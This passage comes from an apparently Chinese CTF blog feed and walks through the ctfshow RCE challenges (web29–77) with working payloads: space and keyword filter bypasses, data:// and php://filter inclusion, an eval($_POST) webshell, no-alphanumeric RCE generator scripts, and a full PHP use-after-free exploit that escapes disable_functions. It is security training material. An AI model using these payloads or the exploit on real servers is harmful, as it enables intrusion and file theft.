//tab&#123;cat,flag.txt&#125; cat$&#123;IFS&#125;$9flag.txt  //$IFS在linux下表示为空格cat&#123;IFS&#125;flag.txtcat$IFSflag.txtcat$&#123;IFS&#125;flag.txtcat$IFS$1flag.txt //$1改成$加其他数字都行catIFSflag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt ca\t fl\ag</code></pre><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;         2.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php        3.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>include可以不用括号,分号用?&gt;代替</p><h3 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h3><p>这四关都可以前面的payload，36关只需把1换成a就行了</p><pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php        2.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>php总比较常用的可以不加括号的函数有:</p><pre><code>`echo`、`print`、`isset`、`unset`、`include`、`require`</code></pre><h2 id="类型二-变量c接收并过滤传入的数据-include来包含文件"><a href="#类型二-变量c接收并过滤传入的数据-include来包含文件" class="headerlink" title="类型二:变量c接收并过滤传入的数据,include来包含文件"></a>类型二:变量c接收并过滤传入的数据,include来包含文件</h2><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>这关要用到php伪协议data:&#x2F;&#x2F;</p><pre><code>payload ?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);?&gt;        ?c=data:,&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;  //可以直接用蚁剑连接</code></pre><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>过滤了php和file，可以用&lt;?&#x3D;或进行base64编码</p><pre><code>payload c=data://text/plain,&lt;?=system(&quot;cat f*&quot;);?&gt;        c=data:text/base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhKiIpOw==</code></pre><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code>payload c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;</code></pre><p>.php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用</p><h3 id="web40-属于类型一"><a href="#web40-属于类型一" class="headerlink" title="web40  属于类型一"></a>web40  属于类型一</h3><p>此题考察无参数函数构造，参考大佬们写的：</p><p>函数：print_r(scandir(‘.’))可以用来查看当前目录所有文件名，我们要做的是将括号中的.替换掉</p><p>localeconv()函数返回一包含本地数字及货币格式信息的数组，如下只是该函数的一部分数组元素</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/44337.png" class=""><p>可利用localeconv()函数返回数组中的第一个小数点代替读取目录函数print_r(scandir(‘.’))中的参数 .<br>那么如何将数组中的第一个元素读取出来呢？可以使用以下函数：</p><pre><code>current()函数返回数组中的当前元素/单元，默认取第一个值； pos()函数同上，是current()函数的别名； reset()函数，当数组不为空时返回数组第一个单元的值，如果数组为空则返回FALSE</code></pre><p>可以得到flag.php位于数组的第三个值里，也就是倒数第二个，我们可以通过array_reverse()函数以相反的元素顺序返回数组，在用next()函数读取下一个元素，最后通过highlight_file()函数读取到flag.php</p><pre><code>payload ①?c=print_r(scandir(pos(localeconv())));        ②?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p>更多操作参考<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h3 id="web41-属于类型一"><a href="#web41-属于类型一" class="headerlink" title="web41 属于类型一"></a>web41 属于类型一</h3><p>这关是无字母数字命令执行</p><p>p神原话：在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><p>以下参考<a href="https://blog.csdn.net/Sapphire037/article/details/121054836">https://blog.csdn.net/Sapphire037/article/details/121054836</a></p><p>通过代码审计我们可以知道这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，但是留了一个<code>|</code>也就是或运算还可以用，这个时候利用Y4师傅和羽师傅的脚本结合，即可很方便的做出来这题。先看Y4师傅的脚本</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date:   2020-11-21 20:31:22*///或function orRce($par1, $par2)&#123;    $result = (urldecode($par1)|urldecode($par2));    return $result;&#125;//异或function xorRce($par1, $par2)&#123;    $result = (urldecode($par1)^urldecode($par2));    return $result;&#125;//取反function negateRce()&#123;    fwrite(STDOUT,&#39;[+]your function: &#39;);    $system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));    fwrite(STDOUT,&#39;[+]your command: &#39;);    $command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));    echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;&#125;//mode=1代表或，2代表异或，3代表取反//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式function generate($mode, $preg=&#39;/[0-9]/i&#39;)&#123;    if ($mode!=3)&#123;        $myfile = fopen(&quot;rce.txt&quot;, &quot;w&quot;);        $contents = &quot;&quot;;        for ($i=0;$i&lt;256;$i++)&#123;            for ($j=0;$j&lt;256;$j++)&#123;                if ($i&lt;16)&#123;                    $hex_i = &#39;0&#39;.dechex($i);                &#125;else&#123;                    $hex_i = dechex($i);                &#125;                if ($j&lt;16)&#123;                    $hex_j = &#39;0&#39;.dechex($j);                &#125;else&#123;                    $hex_j = dechex($j);                &#125;                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;                &#125;else&#123;                    $par1 = &quot;%&quot;.$hex_i;                    $par2 = &#39;%&#39;.$hex_j;                    $res = &#39;&#39;;                    if ($mode==1)&#123;                        $res = orRce($par1, $par2);                    &#125;else if ($mode==2)&#123;                        $res = xorRce($par1, $par2);                    &#125;                    if (ord($res)&gt;=32&amp;ord($res)&lt;=126)&#123;                        $contents=$contents.$res.&quot; &quot;.$par1.&quot; &quot;.$par2.&quot;\n&quot;;                    &#125;                &#125;            &#125;        &#125;        fwrite($myfile,$contents);        fclose($myfile);    &#125;else&#123;        negateRce();    &#125;&#125;generate(1,&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;);//1代表模式，后面的是过滤规则</code></pre><p>再利用羽师傅的脚本</p><pre><code class="python"># -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php D:\\phpstudy_pro\\WWW\\rce.php&quot;)  # 没有将php写入环境变量需手动运行if (len(argv) != 2):    print(&quot;=&quot; * 50)    print(&#39;USER：python exp.py &lt;url&gt;&#39;)    print(&quot;eg：  python exp.py http://ctf.show/&quot;)    print(&quot;=&quot; * 50)    exit(0)url = argv[1]def action(arg):    s1 = &quot;&quot;    s2 = &quot;&quot;    for i in arg:        f = open(r&quot;D:\phpstudy_pro\WWW\rce.txt&quot;, &quot;r&quot;)//填txt的文件位置        while True:            t = f.readline()            if t == &quot;&quot;:                break            if t[0] == i:                # print(i)                s1 += t[2:5]                s2 += t[6:9]                break        f.close()    output = &quot;(\&quot;&quot; + s1 + &quot;\&quot;|\&quot;&quot; + s2 + &quot;\&quot;)&quot;    return (output)while True:    param = action(input(&quot;\n[+] your function：&quot;)) + action(input(&quot;[+] your command：&quot;))    data = &#123;        &#39;c&#39;: urllib.parse.unquote(param)    &#125;    r = requests.post(url, data=data)    print(&quot;\n[*] result:\n&quot; + r.text)</code></pre><p>上面就注意下php脚本的位置和生成的rce.txt的位置还有接受的参数比如上面是c，换个参数就把c改了就行</p><p>那么完整流程就是</p><pre><code>1.先改一下php脚本中generate函数里的参数，也就是设置模式和正则2.python rce_.py url</code></pre><p>可以看看p神的博客</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p><h2 id="类型三-接受并过滤传入的变量拼接命令执行（system函数）"><a href="#类型三-接受并过滤传入的变量拼接命令执行（system函数）" class="headerlink" title="类型三:接受并过滤传入的变量拼接命令执行（system函数）"></a>类型三:接受并过滤传入的变量拼接命令执行（system函数）</h2><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><p>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 也可以写成“1&gt; &#x2F;dev&#x2F;null 2&gt; &amp;1”,我们写入的命令的执行结果会被黑洞吞掉。</p><p>分隔符变量拼接可以用分隔符来控制后面语句的执行</p><p>分割符</p><pre><code>; 分号顺序执行&amp;&amp; 顺序执行|| 前边执行成功则不再执行换行符(在url中是%0a)&amp; (在url中是%26)</code></pre><p>注意，通过url传递&amp;&amp;时要记得urlencode为%26%26，否则会被当作url参数的分隔符而不是shell命令的分隔符。</p><pre><code>payload c=cat flag.php%26</code></pre><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>过滤了cat，用tac替换</p><pre><code>paylaod c=tac flag.php%26</code></pre><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre><code>payload c=tac f*%26</code></pre><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>用%09替换空格</p><pre><code>paylaod c=tac%09f*%26</code></pre><p>常见的空格替换</p><pre><code>%09，%20，$IFS、$&#123;IFS&#125;、$IFS$9，&#123;tac,*&#125;，&lt;，&lt;&gt;</code></pre><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>过滤了*和数字</p><pre><code>payload c=tac%09fla&#39;&#39;g.php||        c=tac%09fl[a-z]g.php||</code></pre><p>%09解码后是水平制表符，而不是数字</p><h3 id="web47-49"><a href="#web47-49" class="headerlink" title="web47-49"></a>web47-49</h3><pre><code>payload c=tac%09fla&#39;&#39;g.php||</code></pre><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>屏蔽了x09和x26，也就是屏蔽了%09和%26，用其他方式绕过空格,这关用不了[a-z]了</p><pre><code>payload c=tac&lt;&gt;fl\ag.php||</code></pre><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>tac被ban了</p><pre><code>payload c=ta&#39;&#39;c&lt;&gt;fla\g.php||        c=ta\c&lt;&gt;fla\g.php||        c=nl&lt;&gt;fla\g.php||</code></pre><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>&lt;&gt;尖括号被过滤了但是$没过滤</p><pre><code>?c=ls$&#123;IFS&#125;../../../||   //flag在根目录c=ta\c$&#123;IFS&#125;../../../fl\ag||</code></pre><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>多过滤了wget，没影响</p><pre><code>payload ?c=ta\c$&#123;IFS&#125;fla\g.php</code></pre><p>注意，这一关没有了黑洞</p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>1.可以使用grep命令：</p><pre><code>?c=grep$&#123;IFS&#125;ctf$&#123;IFS&#125;fl?g.php</code></pre><p>2.可以使用mv命令</p><pre><code>?c=mv$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt  //直接访问a.txt</code></pre><ol start="3"><li>&#x2F;bin下存放一些普通的基本命令，可以使用通配符去调用命令</li></ol><pre><code>?c=/bin/?at$&#123;IFS&#125;f???????</code></pre><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><p>方法一：通过匹配bin下存在的命令进行读取flag。<br> bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br> 我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是&#x2F;bin&#x2F;ls</p><pre><code>payload ?c=/???/????64 ????.???//也就是?c=/bin/base64 flag.php</code></pre><p>方法二：bzip2的使用</p><pre><code>payload：?c=/???/???/????2 ????.???//也就是/usr/bin/bzip2 flag.php然后访问/flag.php.bz2进行下载获得flag.php</code></pre><p>注:<strong>&#x2F;bin</strong> 是所有用户都可以访问并执行的可执行程序。包括超级用户及一般用户。<br>      <strong>&#x2F;usr&#x2F;bin</strong> 是系统安装时自带的一些可执行程序。即系统程序。</p><p>方法三：</p><p>可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php?????[@-[]（上传的文件在linux下面一般保存在&#x2F;tmp&#x2F;php??????一般后面的6个字符是五个小写加一个大写，大写可以通过linux的匹配符去匹配，不过因为是随机生成的大写字母，不一定每次都是大写，可以多试几下。）<br>注意：通过.去执行sh命令不需要有执行权限<br>需要先构造一个post上传文件的数据包。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>然后抓包并修改文件内容改为shell命令，并且传入c参数：</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/155054.png" class=""><p>可以看看p神的无字母数字提高篇<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>过滤了数字，使用前一关的第三种方法即可</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>这关需要构造出36。</p><p>$(()) 代表做一次运算，因为里面为空，也表示值为0</p><p>$((~$(())))对0作取反运算，值为-1（如果对a按位取反，则得到的结果为-(a+1)）<br>$(($((~$(())))$((~$(()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2</p><p>写个脚本生成payload:</p><pre><code class="php">data = &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;print(data)</code></pre><h3 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h3><p>禁用了一些函数，直接读取文件</p><p>首先获取文件路径</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/104435.png" class=""><pre><code>c=print_r(scandir(dirname(&#39;./&#39;)));c=var_dump(scandir(&#39;./&#39;));c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;c=$a=&quot;glob:///*&quot;;if($b=opendir($a))&#123;while(($file=readdir($b))!==false)&#123;echo $file.&quot;\n&quot;;&#125;&#125;c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;c=$a=dir(getcwd());while ($file = $a-&gt;read())&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;</code></pre><p>php读取文件函数：</p><pre><code>file()把整个文件读入一个数组中readfile()读取文件fpassthru()读取文件highlight_file()读文件show_source()同上base64_decode()base64解码strrev()反转字符串php_strip_whitespace()  返回删除注释和空格后的PHP源码file_get_contents()   将整个文件读入一个字符串include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码示例：echo file_get_contents(&quot;flag.php&quot;);   print_r(file(&#39;flag.php&#39;));var_dump(file(&#39;flag.php&#39;));include(&#39;flag.php&#39;);echo $flag;var_dump(glob(&quot;*flag*&quot;)); // 寻找与模式匹配的文件路径include(&#39;flag.php&#39;);var_dump(get_defined_vars()); //get_defined_vars()函数返回由所有已定义变量所组成的数组。</code></pre><p>通过fopen读取文件内容</p><pre><code>fread()fread($file,100)     读取打开的文件，读取100个字节fgets()读取一行fgetc()读取一个字符fgetss()fgetcsv()读取一行gpassthru()payload:c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;//一行一行读取c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;//一个一个字符读取c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</code></pre><p>也可以通过复制，重命名读取php文件内容</p><pre><code>copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);             rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><p>还可以直接用蚁剑连接。</p><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>show_source()被ban了，使用highlight_file()，这次的flag在flag.txt里，先查目录，再进文件。</p><pre><code>c=print_r(scandir(&#39;../../../&#39;));c=highlight_file(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>print_r被ban了</p><pre><code>c=var_dump(scandir(&#39;../../../&#39;));c=highlight_file(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>highlight_file()被ban了，但因为flag在txt里，所以可以用include()</p><pre><code>c=var_dump(scandir(&#39;../../../&#39;));c=include(&#39;../../../flag.txt&#39;);</code></pre><h3 id="web69-70"><a href="#web69-70" class="headerlink" title="web69-70"></a>web69-70</h3><p>print_r()和var_dump()都被ban了，用其他方式读目录</p><pre><code>c=$a=opendir(&#39;./&#39;);while(($file=readdir($a))!==false)&#123;echo $file.“&lt;/br&gt;”;&#125;;c=include(&#39;/flag.txt&#39;);</code></pre><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>下载附件</p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/212130.png" class=""><pre><code>ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</code></pre><pre><code>payload c=include(&quot;/flag.txt&quot;);exit();</code></pre><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>尝试读取根目录</p><pre><code>c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</code></pre><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/215446.png" class=""><p>open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。<br> disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空。<br> ini_set()用于设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。但是这题也给ban了。<br> 那么可以使用glob伪协议绕过open_basedir</p><pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();</code></pre><p>然后可以看到flag文件名为flag0.txt，但是由于open_basedir的限制，还是不可以直接include进来，需要想其它的办法。使用UAF。脚本如下：记得要把c&#x3D;之后的内容url编码：</p><pre><code>c=function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                              if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                    if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();#需要通过url编码哦</code></pre><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><p>扫描目录</p><pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();c=$d=opendir(&quot;../../../&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit(); //跟着别的教程走了半天，最后发现这两关没有被open_basedir限制</code></pre><p>直接用include</p><pre><code>c=include(&quot;/flagc.txt&quot;);exit(0);c=require(&quot;/flagc.txt&quot;);exit(0);</code></pre><h3 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h3><p>直接include()不行了，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag</p><pre><code>c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</code></pre><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>看大佬说是要用到使用PHP7.4以上才有的FFI进行命令执行</p><pre><code>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的$ffi-&gt;system($a);//通过$ffi去调用system函数</code></pre><p>参考：<a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/224159.png" class=""><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>p:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file()、include()、highlight_file()和file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p><p>php:&#x2F;&#x2F;filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。</p><p><strong>协议参数</strong>：</p><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/120759.png" class=""><p><strong>过滤器</strong></p><p>这里只例举常用过滤器，详情请参考<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p><img src="/2023/04/04/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/123006.png" class=""><p>常用：</p><pre><code>1.php://filter/read=convert.base64-encode/resource=index.php2.php://filter/resource=index.php</code></pre><p>利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p><h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" 